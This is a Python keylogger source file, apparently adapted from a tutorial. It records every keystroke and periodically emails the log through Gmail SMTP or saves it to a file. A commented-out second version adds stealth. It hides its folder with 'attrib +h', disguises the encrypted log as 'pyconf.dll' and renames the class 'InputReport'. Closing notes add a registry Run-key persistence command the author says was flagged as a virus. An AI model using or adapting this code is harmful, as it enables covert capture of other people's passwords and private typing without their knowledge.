import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "put_real_address_here@gmail.com"
EMAIL_PASSWORD = "put_real_pw"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

    
if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()


## =================================================================
## File Only Version
## Updated 2021-11-23    
## =================================================================
## import keyboard
## import os
## from threading import Timer
## from datetime import datetime
## from cryptography.fernet import Fernet
## 
## SEND_REPORT_EVERY = 10
## 
## class InputReport:
##     def __init__(self, interval, report_method="file"):
##         self.interval = interval
##         self.report_method = report_method
##         self.log = ""
##         os.system(r"attrib +h " + os.getcwd())
## 
##     def callback(self, event):
##         name = event.name
##         if len(name) > 1:
##             if name == "space":
##                 name = " "
##             elif name == "enter":
##                 name = "[ENTER]\n"
##             elif name == "decimal":
##                 name = "."
##             else:
##                 name = name.replace(" ", "_")
##                 name = f"[{name.upper()}]"
##         self.log += name
##     
##     def update_filename(self):
##         self.filename = f"pyconf.dll"
##             
##     def report_to_file(self):
##         with open(f"{self.filename}", "a") as f:
##             self.encrypt_data()
##             print(self.encrypted, file=f)
##             print("", file=f)
## 
##     def encrypt_data(self):
##         key = Fernet.generate_key()
##         with open(f"{self.filename}", "ab") as pyphrase:
##            pyphrase.write(key)
##         with open(f"{self.filename}", "a") as pyphrase:
##            pyphrase.write("\n")
##         fernet = Fernet(key)
##         self.encrypted = fernet.encrypt(self.log.encode())
## 
##     def report(self):
##         if self.log:
##             self.update_filename()
##             self.report_to_file()
##         self.log = ""
##         timer = Timer(interval=self.interval, function=self.report)
##         timer.daemon = True
##         timer.start()
## 
##     def start(self):
##         self.start_dt = 1
##         keyboard.on_release(callback=self.callback)
##         self.report()
##         keyboard.wait()
## 
##     
## if __name__ == "__main__":
##     inputReport = InputReport(interval=SEND_REPORT_EVERY, report_method="file")
##     inputReport.start()
## 
##     
## Reference
## ====================================================
## https://www.thepythoncode.com/article/write-a-keylogger-python
## https://stackoverflow.com/questions/4706499/how-do-you-append-to-a-file
## https://stackoverflow.com/questions/43441883/how-can-i-make-a-file-hidden-on-windows    
## https://stackoverflow.com/questions/37400974/unicode-error-unicodeescape-codec-cant-decode-bytes-in-position-2-3-trunca
## https://stackoverflow.com/questions/3430372/how-do-i-get-the-full-path-of-the-current-files-directory
## https://docs.python.org/3/library/os.path.html
##
## WIP
## ====================================================
## os.system("taskkill /im make.exe /f")
## os.system(r"reg add " + r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" + r" /V systext /t REG_SZ /F /D " + os.path.abspath(__file__)) -- Flagged as virus
## Self-kill at end of day


